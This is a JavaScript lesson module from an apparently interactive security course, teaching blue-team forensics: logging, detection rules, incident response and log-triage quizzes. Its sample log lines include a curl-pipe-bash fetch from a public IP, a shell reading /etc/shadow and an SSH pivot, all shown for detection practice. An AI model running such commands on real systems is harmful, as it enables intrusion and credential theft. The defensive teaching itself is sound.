// Level 12 — Forensics & blue team
EHT.registerLevel({
  id: 12,
  title: 'Forensics &amp; Blue Team',
  whyItMatters: 'Most security careers are blue, not red. Logs, alerts, and triage workflows are where breaches actually get caught — usually weeks or months after the initial intrusion. Knowing what to look for in logs makes you a far better attacker too: you learn what NOT to leave behind.',
  glossary: ['IOC', 'SIEM', 'EDR', 'YARA', 'TTPs'],
  learn: ''
    + '<h4>The detection pipeline</h4>'
    + '<ol>'
    +   '<li><strong>Telemetry</strong> — endpoints, network, cloud, apps emit logs/events.</li>'
    +   '<li><strong>Collection</strong> — agents/forwarders ship to a central store (SIEM).</li>'
    +   '<li><strong>Detection</strong> — rules / ML / threat-hunt queries fire alerts on suspicious patterns.</li>'
    +   '<li><strong>Triage</strong> — analyst decides: false positive, real, or escalation needed.</li>'
    +   '<li><strong>Response</strong> — contain (isolate host, kill process, revoke credentials), eradicate, recover.</li>'
    +   '<li><strong>Post-mortem</strong> — root cause, timeline, lessons.</li>'
    + '</ol>'

    + '<h4>What to log</h4>'
    + '<ul>'
    +   '<li><strong>Authentication events</strong> — successes AND failures. Both useful: failure spikes = brute force; unusual successes = credential compromise.</li>'
    +   '<li><strong>Privileged actions</strong> — sudo invocations, role assumptions, admin-panel access, secret retrievals.</li>'
    +   '<li><strong>Process execution</strong> — Sysmon on Windows, auditd / EDR on Linux. Captures every spawned process with its parent and command line. The single most useful telemetry for IR.</li>'
    +   '<li><strong>Network connections</strong> — flow logs, DNS queries (super valuable: most C2 leaks here).</li>'
    +   '<li><strong>Application audit logs</strong> — what users did inside the app. Especially data exports.</li>'
    + '</ul>'

    + '<h4>What NOT to log</h4>'
    + '<ul>'
    +   '<li>Passwords (especially after auth submission — yes, this still happens).</li>'
    +   '<li>Credit card / SSN in plaintext (PCI / GDPR concerns).</li>'
    +   '<li>Auth tokens / API keys.</li>'
    + '</ul>'
    + '<p>"Don\'t log secrets" is a recurring real bug — the access logs and the request bodies leak credentials when developers add request-body logging for debugging.</p>'

    + '<h4>The IOC pyramid (revisited)</h4>'
    + '<p>From level 0: bottom-of-pyramid IOCs (hashes, IPs) are easy for attackers to change; top (TTPs) is painful. Detections built on TTPs survive infrastructure rotation.</p>'
    + '<p>Concrete blue-team translation:</p>'
    + '<table class="spec-table" style="margin:12px 0">'
    + '<tr><th>Detection target</th><th>Cost to attacker to evade</th></tr>'
    + '<tr><td>Hash of malware.exe</td><td>Trivial: recompile, change a comment</td></tr>'
    + '<tr><td>IP / domain block list</td><td>Minutes to swap</td></tr>'
    + '<tr><td>Filename / path artifact</td><td>Hours</td></tr>'
    + '<tr><td>Specific tool signature (e.g. Cobalt Strike beacon JA3)</td><td>Days — switch tools</td></tr>'
    + '<tr><td><strong>Behavior</strong>: lsass.exe access by non-system process; powershell.exe spawned by winword.exe; suspicious DNS query patterns</td><td>Weeks to months — actor must change how they operate</td></tr>'
    + '</table>'

    + '<h4>Log analysis: what suspicious looks like</h4>'
    + '<p>A few canonical patterns:</p>'
    + '<ul>'
    +   '<li><strong>Many failed logins from one IP</strong> — brute force / credential stuffing.</li>'
    +   '<li><strong>Successful login from unusual geo / time</strong> — credential compromise.</li>'
    +   '<li><strong>Successful login followed by mass data export</strong> — exfiltration.</li>'
    +   '<li><strong>Office product spawning cmd.exe / powershell.exe</strong> — macro malware.</li>'
    +   '<li><strong>powershell -enc base64...</strong> — encoded payload, classic LotL.</li>'
    +   '<li><strong>Repeated DNS queries to algorithmically-generated domains</strong> — DGA-based C2.</li>'
    +   '<li><strong>Outbound traffic in bursts of identical small sizes at fixed intervals</strong> — beaconing.</li>'
    +   '<li><strong>Privileged action by a service account that\'s never touched it before</strong> — credential theft.</li>'
    + '</ul>'

    + '<h4>Sigma rules and KQL</h4>'
    + '<p>Detection rules are written in vendor-neutral languages (Sigma, Yara-L) or vendor-specific ones (KQL for Microsoft Sentinel/Defender, SPL for Splunk). Sigma converts to most backends.</p>'
    + '<div class="example"><div class="label">A toy Sigma rule (Office spawning shell)</div>'
    + '<code>detection:<br>'
    + '&nbsp;&nbsp;selection:<br>'
    + '&nbsp;&nbsp;&nbsp;&nbsp;ParentImage|endswith: \'\\winword.exe\'<br>'
    + '&nbsp;&nbsp;&nbsp;&nbsp;Image|endswith: [\'\\cmd.exe\', \'\\powershell.exe\']<br>'
    + '&nbsp;&nbsp;condition: selection</code>'
    + '</div>'

    + '<h4>Incident response — the basic flow</h4>'
    + '<ol>'
    +   '<li><strong>Preparation</strong> — runbooks, comms plans, retainer with IR firm if you don\'t have in-house.</li>'
    +   '<li><strong>Identification</strong> — confirm the alert is real; scope (one host? many?).</li>'
    +   '<li><strong>Containment</strong> — isolate. Network-isolate the host (don\'t shut down — preserves volatile state). Revoke credentials. Block C2 indicators.</li>'
    +   '<li><strong>Eradication</strong> — remove the threat. Reimage compromised hosts (fresh OS, fresh credentials). Don\'t "clean and trust."</li>'
    +   '<li><strong>Recovery</strong> — restore from clean backups; validate; restore service.</li>'
    +   '<li><strong>Lessons learned</strong> — root cause analysis, fix the gap.</li>'
    + '</ol>'

    + '<h4>Common rookie mistakes</h4>'
    + '<ul>'
    +   '<li><strong>Reboot the box</strong> immediately — destroys volatile evidence (memory, network state).</li>'
    +   '<li><strong>Run AV scan</strong> as the only response — modern attackers persist far past AV detection.</li>'
    +   '<li><strong>Trust the cleaned host</strong> — re-image. Always.</li>'
    +   '<li><strong>Notify too few</strong> — legal, comms, leadership all need to be in the loop early.</li>'
    +   '<li><strong>Investigate forever</strong> without a containment decision — attackers move fast; pick a reasonable time-box.</li>'
    + '</ul>'

    + '<div class="callout"><div class="label">"Assume breach"</div>'
    + 'A useful frame: stop building security as if breaches won\'t happen. Build with the assumption that an adversary IS in your network already. This shifts emphasis from prevention (still important) to detection, lateral-movement obstruction, and limiting blast radius (segmentation, least privilege, just-in-time access).'
    + '</div>',

  mountPlay: function (container) {
    container.innerHTML = '<p class="muted">Click each log line. Some are normal, some are suspicious. See the explanation.</p>';
    var lines = [
      { text: 'Apr 12 03:14:22 web1 sshd[1234]: Accepted publickey for deploy from 10.0.0.5 port 51234 ssh2', sus: false, why: 'Normal automated deploy login. Public key from internal IP. Routine.' },
      { text: 'Apr 12 03:15:01 web1 sshd[1244]: Failed password for invalid user admin from 45.142.182.13 port 22341 ssh2', sus: false, why: 'One failed login from external IP — noisy internet background. Watch the rate, not single events.' },
      { text: 'Apr 12 03:15:02 web1 sshd[1245]: Failed password for invalid user root from 45.142.182.13 port 22344 ssh2', sus: true, why: 'Combined with previous 5,000 attempts/sec from same IP across user accounts → brute force / spraying. Block IP at firewall, fail2ban.' },
      { text: 'Apr 12 04:22:11 web1 audit: USER_CMD pid=8421 uid=33 (www-data) cmd="curl http://5.42.x.x/x.sh | bash"', sus: true, why: 'www-data running curl-pipe-bash to a public IP. Almost certainly post-exploitation: dropper running. Investigate now.' },
      { text: 'Apr 12 04:22:13 web1 audit: SYSCALL execve pid=8422 ppid=8421 comm="bash" exe="/usr/bin/bash"', sus: true, why: 'Continuation: shell spawned from the curl-bash. Typical RCE → reverse-shell pattern.' },
      { text: 'Apr 12 09:00:01 web1 cron[1990]: (root) CMD (/etc/cron.daily/logrotate)', sus: false, why: 'Normal scheduled log rotation. Routine.' },
      { text: 'Apr 12 11:34:50 web1 audit: SYSCALL execve pid=11201 ppid=8422 comm="cat" exe="/usr/bin/cat" args="/etc/shadow"', sus: true, why: 'After the curl-bash earlier, the spawned shell is now reading /etc/shadow. Lateral movement / credential harvest.' },
      { text: 'Apr 12 11:35:12 web1 audit: SYSCALL execve pid=11210 ppid=8422 comm="ssh" exe="/usr/bin/ssh" args="db1.internal"', sus: true, why: 'Compromised web host pivoting to internal DB host. Lateral movement. Isolate web1 from internal network NOW.' }
    ];
    var box = document.createElement('div');
    var output = document.createElement('div'); output.className = 'formula-box';
    output.innerHTML = '<span class="muted">← click a log line</span>';
    lines.forEach(function (l, i) {
      var b = document.createElement('div');
      b.className = 'terminal';
      b.style.cursor = 'pointer';
      b.style.margin = '4px 0';
      b.style.padding = '6px 10px';
      b.innerHTML = (l.sus ? '<span class="bad">●</span> ' : '<span class="out">○</span> ') + EHT.escapeHtml(l.text);
      b.addEventListener('click', function () {
        Array.prototype.forEach.call(box.querySelectorAll('.terminal'), function (e) { e.style.borderColor = 'var(--border)'; });
        b.style.borderColor = 'var(--accent)';
        output.innerHTML =
          '<div><strong style="color:var(--accent)">' + (l.sus ? 'Suspicious' : 'Normal') + '</strong></div>' +
          '<div class="info-line"><span class="key">Reason:</span> <span class="val">' + l.why + '</span></div>';
      });
      box.appendChild(b);
    });
    container.appendChild(box);
    container.appendChild(output);
  },

  puzzles: [
    {
      difficulty: 'easy',
      prompt: 'During an incident, your colleague is about to <code>shutdown -h now</code> a compromised box "to be safe." What do you do?',
      mountInput: function (c) {
        var sel = document.createElement('select');
        sel.innerHTML = '<option value="">— pick one —</option>' +
          '<option>Stop them — shutdown destroys volatile evidence (memory, running processes, network state). Network-isolate instead, capture memory, then preserve.</option>' +
          '<option>Help — fastest containment</option>' +
          '<option>Reformat afterward</option>' +
          '<option>Run a virus scan first</option>';
        c.appendChild(sel);
        return function () { return sel.value; };
      },
      check: function (v) {
        if (v.indexOf('Stop them') === 0) return { correct: true, feedback: 'Right. Volatile evidence — RAM, network connections, running processes — disappears on shutdown. Modern IR captures memory (e.g., LiME on Linux) BEFORE losing power. For containment, network-isolate the host (firewall rule cutting it off from everything except investigator IP). The host stays running for forensics.' };
        return { correct: false, feedback: 'Shutdown destroys volatile evidence. Network-isolate, capture memory, then forensics.' };
      },
      hints: [
        'What evidence disappears when you power off?',
        'RAM, running processes, network connections — gone.',
        'Network-isolate, capture memory, THEN consider shutdown.'
      ]
    },
    {
      difficulty: 'medium',
      prompt: 'You see this Sysmon log: <code>winword.exe → cmd.exe → powershell.exe -enc &lt;long base64&gt;</code>. What pattern is this, and what should the SOC do first?',
      mountInput: function (c) {
        var sel = document.createElement('select');
        sel.innerHTML = '<option value="">— pick one —</option>' +
          '<option>Macro-based malware: Word document with a malicious macro spawned a shell that ran an encoded PowerShell payload. Decode the base64 to inspect (in a sandbox); isolate the host; pull the original .docx from email; check who else got it; consider re-imaging.</option>' +
          '<option>Routine PowerShell — every Word doc launches PowerShell</option>' +
          '<option>It\'s benign because the user clicked Enable Editing</option>' +
          '<option>Just delete the powershell.exe to fix it</option>';
        c.appendChild(sel);
        return function () { return sel.value; };
      },
      check: function (v) {
        if (v.indexOf('Macro-based malware') === 0) return { correct: true, feedback: 'Right. Office spawning a shell is one of the highest-fidelity malware indicators on Windows. <code>powershell -enc</code> is base64-encoded — almost always malicious in this context (admins use scripts, not encoded one-liners). Steps: (1) decode base64 in a sandbox to see what it does; (2) isolate the host; (3) find the source email/doc; (4) hunt for the same indicators across the fleet; (5) probably re-image the host. Microsoft Defender, EDRs, and Sysmon-based SIEM rules all alert on this exact pattern.' };
        return { correct: false, feedback: 'This is the textbook fingerprint of macro-based initial access. Office product spawning a shell that runs an encoded PowerShell payload.' };
      },
      hints: [
        'Office product spawning a shell is unusual.',
        '-enc means base64-encoded payload — admins use scripts, not encoded blobs.',
        'Macro malware. Isolate, decode, hunt, re-image.'
      ]
    },
    {
      difficulty: 'hard',
      prompt: 'Threat intel shares this IOC for "Actor X": "Uses HTTP beaconing to a fronted CDN domain every 60 ± 5 seconds; binary signed with stolen cert from Company Y; uses Cobalt Strike with default Malleable C2 profile." Your CISO asks "what should we DETECT on?" Which choice gives the most resilient detection?',
      mountInput: function (c) {
        var sel = document.createElement('select');
        sel.innerHTML = '<option value="">— pick one —</option>' +
          '<option>Block the specific CDN domain</option>' +
          '<option>Block the file hash of the signed binary</option>' +
          '<option>Detect on Cobalt Strike default Malleable C2 profile signature (JA3, beacon timing, default URI patterns) — the actor\'s TTP. They\'ll have to switch tools or customize, which is much more painful than rotating domains/hashes.</option>' +
          '<option>Block all CDN traffic</option>';
        c.appendChild(sel);
        return function () { return sel.value; };
      },
      check: function (v) {
        if (v.indexOf('Detect on Cobalt Strike default Malleable C2 profile signature') === 0) return { correct: true, feedback: 'Right. Pyramid of pain: domains and hashes are cheap for attackers to rotate. The TTP-level signature ("Cobalt Strike default profile + 60s beacon timing") survives the actor swapping infrastructure. They\'d have to switch entire tooling or heavily customize the C2 profile (which most actors don\'t bother with) to evade. JA3/JA3S TLS fingerprinting + beacon-timing analytics are the modern blue-team workhorses for exactly this.' };
        if (v === 'Block the specific CDN domain') return { correct: false, feedback: 'Cheap to rotate. Bottom of pyramid.' };
        if (v === 'Block the file hash of the signed binary') return { correct: false, feedback: 'Trivially changed by recompiling. Bottom.' };
        if (v === 'Block all CDN traffic') return { correct: false, feedback: 'Most legitimate sites use CDNs. You\'d break the internet for users.' };
        return { correct: false, feedback: 'Re-read pyramid of pain (level 0).' };
      },
      hints: [
        'Pyramid of pain: which is hardest for attacker to change?',
        'Specific domain → minutes. File hash → seconds. TTP → weeks.',
        'TTP detection: Cobalt Strike default profile + beacon timing.'
      ]
    }
  ]
});
